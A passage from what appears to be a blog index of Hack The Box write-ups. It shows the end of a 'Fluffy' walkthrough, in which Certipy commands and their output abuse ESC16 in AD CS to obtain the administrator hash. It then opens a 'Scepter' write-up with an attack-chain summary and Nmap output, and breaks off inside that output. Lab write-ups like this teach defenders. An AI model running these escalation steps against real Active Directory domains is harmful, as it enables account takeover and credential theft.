'ca_svc'\n[*] NT hash for 'ca_svc': <SNIP>\n```\n\n## This keeps ESC-aping my mind (ESC16)\n\nWe definitely look at ADCS since its present on the box, running a little check reveals a big mistake in configuration. We find ESC16 available for attack.\n```bash\nkonoha# certipy -debug find -vulnerable -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes :<SNIP> -stdout\n<SNIP>\n    Permissions\n      Owner                             : FLUFFY.HTB\\Administrators\n      Access Rights\n        ManageCa                        : FLUFFY.HTB\\Domain Admins\n                                          FLUFFY.HTB\\Enterprise Admins\n                                          FLUFFY.HTB\\Administrators\n        ManageCertificates              : FLUFFY.HTB\\Domain Admins\n                                          FLUFFY.HTB\\Enterprise Admins\n                                          FLUFFY.HTB\\Administrators\n        Enroll                          : FLUFFY.HTB\\Cert Publishers\n    [!] Vulnerabilities\n      ESC16                             : Security Extension is disabled.\n    [*] Remarks\n      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.\nCertificate Templates                   : [!] Could not find any certificate templates\n```\n### Knipping at the heels\n\nWe can technically get on the box, but lets see if we can just escalate ourselves first. First we update the upn of useraccount *ca_svc* to `administrator`.\n```bash\nkonoha# certipy account -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes <SNIP> -target fluffy.htb -upn administrator@fluffy.htb -user ca_svc update\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : administrator@fluffy.htb\n[*] Successfully updated 'ca_svc'\n```\nThen request a pfx using the *User* template.\n```bash\nkonoha# certipy req -username ca_svc@fluffy.htb -hashes <SNIP> -dc-ip 10.10.11.69 -ca fluffy-DC01-CA -target DC01.fluffy.htb -template User\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 20\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@fluffy.htb'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\nThen simply change the upn back for *ca_svc*.\n```bash\nkonoha# certipy account -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes <SNIP> -target fluffy.htb -upn ca_svc@fluffy.htb -user ca_svc update\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated 'ca_svc'\n```\nFinally, we can auth with this pfx and retrieve the administrator hash.\n```bash\nkonoha# certipy auth -pfx administrator.pfx -domain fluffy.htb -username administrator -dc-ip 10.10.11.69\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@fluffy.htb'\n[*] Using principal: 'administrator@fluffy.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<SNIP>\n```\n\n![](/img/robocop.gif)","tags":["ADCS","GenericWrite","GenericAll","ESC16"],"categories":["htb"]},{"title":"Scepter (Windows Hard)","url":"/2025/05/23/Scepter/","content":"\n![](/img/scepter.png)\n\nInitial Nmap found a NFS containing pfx keys and a key file and a cert file. By use `pfx2john` and creating a hash we crack the password. Then creating a pfx file using the cracked password with openssl. Then we auth and recieve `d.baker` hash. After getting a bloodhound dump we see `d.baker` has `ForceChangePassword` over `a.carter`. After doing so, we see `a.carter` has `GenericAll` over the `Staff Access Certificate`. Using `dacledit.py` we give `a.carter` access. Then we set a mail attribute for `d.baker` to `h.brown@scepter.htb` using bloodyAD. Then request again using upn `h.brown`. From there we can auth and recieve `h.brown`'s hash as well as ccache we can export and use. We have write over `p.adams` account and if we look at `h.brown` attributes we see `altSecurityIdentities`. This is weak encryption and we can set this attribute to `p.adams` and then set `d.baker` mail attribute to `p.adams`. Once done we request again using upn `p.adams`. This get us the hash for `p.adams`, from here we are a Replication Operator and we can just secretsdump to obtain the Administrator hash.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE       REASON          VERSION\n53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-21 02:54:59Z)\n111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.scepter.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb\n| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-01T03:22:33\n| Not valid after:  2025-11-01T03:22:33\n| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018\n| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9\n| -----BEGIN CERTIFICATE-----\n| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF\n| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl\n| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1\n| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ\n| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT\n| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC\n| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+\n| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago\n| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1\n| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC\n| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A\n| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/\n| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3\n| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL\n| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay\n| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj\n| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw\n| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD\n| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl\n| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0\n| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh\n| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl\n| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl\n| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp\n| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF\n| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8\n| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0\n| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K\n| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk\n| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU\n| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd\n| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1\n| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS\n|_-----END CERTIFICATE-----\n|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.\n445/tcp  open  microsoft-ds? syn-ack ttl 127\n464/tcp  open  kpasswd5?     syn-ack ttl 127\n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.scepter.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb\n| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-01T03:22:33\n| Not valid after:  2025-11-01T03:22:33\n| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018\n| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9\n| -----BEGIN CERTIFICATE-----\n| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF\n| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl\n| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1\n| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ\n| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT\n| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC\n| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+\n| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago\n| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1\n| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC\n| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A\n| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/\n| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3\n| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL\n| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay\n| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj\n| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw\n| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD\n| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl\n| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0\n| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh\n| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl\n| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl\n| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp\n| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF\n| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8\n| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0\n| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K\n| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk\n| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU\n| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd\n| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1\n| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS\n|_-----END CERTIFICATE-----\n|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.\n2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)\n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.\n| ssl-cert: Subject: commonName=dc01.scepter.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb\n| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-01T03:22:33\n| Not valid after:  2025-11-01T03:22:33\n| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018\n| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9\n| -----BEGIN CERTIFICATE-----\n| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF\n| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl\n| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1\n| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ\n| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT\n| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC\n| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+\n| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago\n| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1\n| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC\n| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A\n| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/\n| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3\n| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL\n| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay\n| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj\n| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw\n| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD\n| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl\n| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0\n| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh\n| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl\n| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl\n| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp\n| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF\n| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8\n| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0\n| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K\n| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk\n| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU\n| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd\n| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1\n| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS\n|_-----END CERTIFICATE-----\n3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.scepter.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb\n| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-01T03:22:33\n| Not valid after:  2025-11-01T03:22:33\n| MD5:   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018\n| SHA-1: cd9a:97ee:25c8:00ba:1427:c259:02ed:6e0d:9a21:7fd9\n| -----BEGIN CERTIFICATE-----\n| MIIGLDCCBRSgAwIBAgITYgAAACHTgl9VBArXxgAAAAAAITANBgkqhkiG9w0BAQsF\n| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl\n| cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMTAzMjIzM1oXDTI1\n| MTEwMTAzMjIzM1owGzEZMBcGA1UEAxMQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ\n| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALpnNbJF0dXLfbmd6n3LpJlQDKdwZdVT\n| JxqBS7Vz/LPj+ZpUA6JFTi31Jdy8qFqRF3HuBhsA5T+RPLGuhjoNAqMKqlWEcqOC\n| A4VHl99hLPKB0mpqSTVKIXzvvU2Aa2Pc42gGY4nmpODO06an3XddKCMdQx2dPXK+\n| /GUmsYPEszgoefAJLOaJ/ot23i1ffdcYE8c7xbi/ivUmLmOo6zQp/6FCRsJM4Ago\n| OZ0mV9tLt7jfltrNBL+Iq8FWoiV59ciaOmNLNwIo+JqkPjTYJNSuSsiaeVNUtoY1\n| yipUhhDOyX70wc48R20/So6PUOKnkGJ6ovrEQJCEpVBkic/eLlHaWbUCAwEAAaOC\n| AzowggM2MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A\n| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/\n| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3\n| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL\n| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM+Zo2Ay\n| sKIDhRmsELT8JvcQ5qJEMB8GA1UdIwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfj\n| MIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMw\n| MS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD\n| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2Nl\n| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0\n| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh\n| bGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl\n| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2Nl\n| cHRlcixEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp\n| ZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQuQyF\n| jYzg20GS235CRJngkoIQZGMwMS5zY2VwdGVyLmh0YjBLBgkrBgEEAYI3GQIEPjA8\n| oDoGCisGAQQBgjcZAgGgLAQqUy0xLTUtMjEtNzQ4Nzk1NDYtOTE2ODE4NDM0LTc0\n| MDI5NTM2NS0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCKy5wPeTrqhyCr9gEglZ8K\n| EKsHXZsfcQu35qHlaxyWxISCZ4CCDaD+MlTT6fnvw3oyF4Nd8ArI/QQwnqqPxxYk\n| 72HoVo835fo0lP3FeDfnbYT6rUMrv4QVkeJossDwnOnrZuGPtfUEWxNg1O76D2kU\n| gejyZzFgBcvaXAt/pEHVki2Zfdz7p1OAkbjP2cAsjFAAzdAZT1FpRdcL+s1PwZqd\n| urydtAwyuvSqyzDYJgt4aj0kdyNoFexNK2meqw5DdYWnrDTcBLdN4v37kKtMm2w1\n| 9X2shB2kglATgm0ULSz7jHVZNnACrxBBUsofMPVCvpsEBmfCb4zPo6a+oA0MjGsS\n|_-----END CERTIFICATE-----\n|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.\n5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n5986/tcp open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| ssl-cert: Subject: commonName=dc01.scepter.htb\n| Subject Alternative Name: DNS:dc01.scepter.htb\n| Issuer: commonName=dc01.scepter.htb\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-11-01T00:21:41\n| Not valid after:  2025-11-01T00:41:41\n| MD5:   e84c:6894:816e:b7f5:4338:0a1f:a896:2075\n| SHA-1: 4e58:3799:020d:aaf4:d5ce:0c1e:76db:32cd:5a0e:28a7\n| -----BEGIN CERTIFICATE-----\n| MIIDLTCCAhWgAwIBAgIQYr4O5l5zSo9Nt/NWAsz/gDANBgkqhkiG9w0BAQsFADAb\n| MRkwFwYDVQQDDBBkYzAxLnNjZXB0ZXIuaHRiMB4XDTI0MTEwMTAwMjE0MVoXDTI1\n| MTEwMTAwNDE0MVowGzEZMBcGA1UEAwwQZGMwMS5zY2VwdGVyLmh0YjCCASIwDQYJ\n| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALt+NmALaj8ktEddCkYyQCYPKE6NQUr1\n| jAgCUHPqlKlLvRsbWQmTe7R6GNp6oZotbipCeX3dK8URKg/cbiXspKoArfDtJMtL\n| NA3r3+sAS881NPYs+nxOZTQ3ZdLqQBWClXXTHHjg9eLySGOiEoOPtyE2ctw71MHn\n| yyrKW4JYLpI8SNqtjOXW3mXNrsHRbHU3AZ3nh+OrG8T8zWWs3BKGFYtg/8YBoXYE\n| EnLXJ7C+LRwJ+rEF3TLsYYIpSGb5LVgH/9HJ7x6gr7g4CZsdZ7/E+V5rlVa6Y3HU\n| Ta1q3mdme7nsEoBsB7GQJ7TCTtAL85T+Pd4gaxjqJrWkFzRx4dIyQX0CAwEAAaNt\n| MGswDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD\n| ATAbBgNVHREEFDASghBkYzAxLnNjZXB0ZXIuaHRiMB0GA1UdDgQWBBQCeVUszMLJ\n| drdv7S3qV6FfMT7NOzANBgkqhkiG9w0BAQsFAAOCAQEASeFO9X3n9Xpj8GSocGrX\n| GfCyoIvPKHdO18JJVVkehshdXGBUyAlanX90vh5rrqPE2s9rDhqxSUfSl9+deOii\n| aAobzESCZNzvcqiz3IdRFtI+YP/Uz8PPRXdO8KQCPJ2jVLgo/GCuXfllooJJnhOT\n| ZYdRCCMCLNdudmhkwAO7EvwW4cDBhMaZy2GcpIP37yjZpwCvmdBVfN4R5Ra+265V\n| AnYngzq39K+rPSA/eMDHkaQ+q+hTj7XrVXqW8Uyecbw4lMqslZr5/fZJGZS6nmcI\n| 2UEYW/JnpvR02lAZjuoM+/Neu7fl2CEvAggG7vcu0M1TN44adcP3F5tnljuUdy3j\n| jw==\n|_-----END CERTIFICATE-----\n| tls-alpn:\n|_  http/1.1\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_ssl-date: 2025-08-21T02:55:51+00:00; +1h34m31s from scanner time.\n|_http-title: Not Found\nService Info: 